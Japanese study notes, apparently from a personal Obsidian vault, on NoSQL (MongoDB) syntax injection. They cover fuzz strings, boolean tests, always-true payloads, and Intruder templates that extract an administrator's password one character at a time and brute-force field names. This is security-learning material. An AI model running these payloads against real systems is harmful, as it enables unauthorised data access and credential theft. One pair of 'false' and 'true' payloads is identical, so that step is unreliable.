## Syntax injectionの検出

1. 以下のFuzz文字を注入し、Internal server errorなどの通常のレスポンスと違うものが返るか確認する
```
'"`{
;$Foo}
$Foo \xYZ
```
- ⚠️URLエンコードしたり、JSONプロパティの形式になおす必要がある
- URL: `?category='%22%60%7b%0d%0a%3b%24Foo%7d%0d%0a%24Foo%20%5cxYZ%00`
  
2. どの文字がサニタイジングされずに処理されているか確認するため、個別に入力していく

  - 例えばシングルクオートを注入
```
'
```
- レスポンスに変化がある　＝　エスケープ処理されていないことがわかる。

3. 本当にエスケープ処理がされていないかか確認するため、攻撃者側でエスケープ処理してエラーが起きないか確かめる。
```
\'
```
- これで正常な応答があれば、このクエリではエスケープ処理をしていないことがわかる

4. 必ず偽になるbooleanと真になるものを追加し、レスポンスに違いが出ればboolean注入可能である

- 必ず偽になる値(Null byte以外urlencode)
```js
?category=Gifts' && 0%00x
```
![[Pasted image 20240217160019.png | 280]]

- 必ず真になる値(Null byte以外urlencode)
```js
?category=Gifts' && 0%00x
```
![[Pasted image 20240217160137.png | 300]]


5. booleanを注入できるなら、既存の条件式を上書きする
```javascript
' || 1==1%00
```

- **注**：具体的な文法はサーバ側の実装により異なる

### Syntax injection具体例 in MongoDB

#### Syntax injectionに脆弱か確かめる

- 異なるカテゴリの商品を表示するアプリケーションがあるとする
- ユーザが"Fizzy drinks"というカテゴリを選択すると、ブラウザが以下のURLをリクエストする
```url
https://insecure-website.com/product/lookup?category=fizzy
```
- これにより、アプリケーションはJSONクエリを送信し、MongoDBの商品コレクションから関連商品を取得する
```javascript
this.category == 'fizzy'
```

- categoryパラメータにファズ文字列を入力する
```
'"`{
;$Foo}
$Foo \xYZ
```
- URLをリクエストしているのでURLエンコードすること
```
https://insecure-website.com/product/lookup?category='%22%60%7b%0d%0a%3b%24Foo%7d%0d%0a%24Foo%20%5cxYZ%00
```

- これによって元のレスポンスから変化が生じた場合、ユーザ入力が正しくフィルタリングまたはサニタイズされていないことを示している可能性がある。

###### Fuzz文字はコンテキストに合わせること

- NoSQLiはさまざまなコンテキストで発生する可能性がある
- それに応じてファズ文字列を適応させる必要がある
- 例えばURLならURLエンコードする
- JSONプロパティ経由で送信するなら上記のファズ文字列だと以下のようになる
```json
'\"`{\r;$Foo}\n$Foo \\xYZ\u0000
```
- `\"`: JSONではダブルクオートが特殊文字。シングルは特殊文字でない
- `\r`, `\n`: どっち使ってもいい
- `\u0000`: Null文字in JavaScript、Python、Java、C#、C++など

#### どのキャラクタが処理されるかを確認する

- たとえば` ' `を注入すると、次のような MongoDB クエリが返される
```javascript
this.category == '''
```
- 元のレスポンスから変化ある？
- → `'`がクエリのsyntaxを壊し、syntaxエラーを引き起こした

- 引用符をエスケープして有効なクエリ文字列として送信することで、`'`がsyntaxエラーの原因であったことを確認する：
```javascript
this.category == '\''
```
- レスポンスが元通り？
- → サーバ側でこのキャラクタはエスケープ処理がされていないことがわかる

#### booleanで挙動を見る

- アプリケーションの動作が異なるか？
- 偽の条件はクエリロジックに影響を与える
- 真の条件は影響を与えない
- ＝　booleanのsyntaxを注入することがサーバサイドクエリに影響を与えることを示す

- 必ず偽になる値
```js
' && 0%00
```
- `https://insecure-website.com/product/lookup?category=fizzy'+%26%26+0+%26%26+'x`

- 必ず真になる値
```js
' && 1%00
```
- `https://insecure-website.com/product/lookup?category=fizzy'+%26%26+1+%26%26+'x`
- (xは無意味な文字。booleanではない箇所で文法を壊さないようにテストするため)

#### 本来の条件式を上書きする

- 元の条件式に関係なく常に真となる値を注入
```js
' || 1==1%00
```
	↓
```js
this.category == 'fizzy'||'1'=='1'
```

- 注入された条件は常に真なので、修正されたクエリはすべてのアイテムを返す。
- データ抽出完了

###### 🚨
- NoSQLクエリに常にtrueと評価される条件を注入する際には注意が必要
- アプリケーションは1つのリクエストからのデータを複数の異なるクエリで使用するのが一般的。
- 例えば、アプリケーションでデータの更新や削除を行う際にこのクエリを使用すると、偶発的なデータ損失が発生する可能性がある

## Syntax injectionによるデータ抽出

###### この攻撃が成功する場面と理由

- MongoDBの関数である`mapReduce()`や`$where`演算子などを使用している場合。
	- 使用していない場合は自身で演算子を注入する必要アリ-> [3. NoSQL operator injection](3.%20NoSQL%20operator%20injection.md)

- これにより限定的なJavaScriptコードを実行することができるから
- クエリとしてJavaScriptを認識する可能性があるので、JavaScriptのメソッドを使用してDBからデータを抽出できる可能性があるから

###### 方法

1. [2. NoSQL syntax injection](2.%20NoSQL%20syntax%20injection.md#Syntax%20injectionの検出)のステップ4まで実行し、条件式を変更できるか確認する

2. 抽出したいデータのフィールド名を特定する
	- [2. NoSQL syntax injection](2.%20NoSQL%20syntax%20injection.md#フィールド名の特定%20by%20Syntax%20injection)
	- 以下はフィールド名が"password"だとする

3. `length`メソッドでパスワードの文字数を測る。
- Intruderで値が真から偽になる境目を見極める
```javascript
administrator' && this.password.length < §§%00
```
- `this`については[JavaScriptとJSON](../../Misc/JavaScriptとJSON.md#文法)を参照

4. パスワードを1文字ずつブルートフォースする
- Turbo Intruderを使用する
```js
GET /user/lookup?user=administrator' && this.password[%s] == '%s'%00 HTTP/2
```
- `multipleParameters.py`を使用する。
- wordlistはa-z 1-9で自作する
- 💡：最初は全ての結果をテーブルに加え、成功時のlengthをメモし、`req.length`でフィルタすると見やすい

###### 具体例

- ユーザが他の登録されたユーザ名を調べ、その役割を表示する脆弱なアプリケーション
- `https://insecure-website.com/user/lookup?username=admin`

- これが以下のようなクエリになるとする
```json
{"$where":"this.username == 'admin'"}
```

- このクエリは`$where`を使用しているので、このクエリにJavaScriptの関数を注入して機密データを返すようにできる
```js
admin' && this.password[0] == 'a' %00
```

- またはJavaScriptの`match()`と正規表現を使用して検索できる
```js
admin' && this.password.match(/\d/) %00
```
- 正規表現については徳丸本p.112を参照

## フィールド名の特定 by Syntax injection

- `this.[?field?]` ← ここがわからないとデータの抽出ができない

##### フィールド名の特定

###### 特定のフィールドが存在するか

1. 条件が偽のときのレスポンスと真のときのレスポンスの違いを確認する
- 偽
```
/?search=admin' && 0 == 1%00
```
- 真
```
/?search=admin' && 0 == 0%00
```


2. フィールド名に検討がついている時はその名前を、検討がつかない時はbrute-forceし、条件が真のときのレスポンスと同じものが返るか確かめる

- 検討がついている場合：password
```
/?search=admin' && this.password%00
```

- 検討がついていない場合：Intruder -> Payload settings -> Add from list -> Form field names -long
```
/?search=admin' && this.§§%00
```
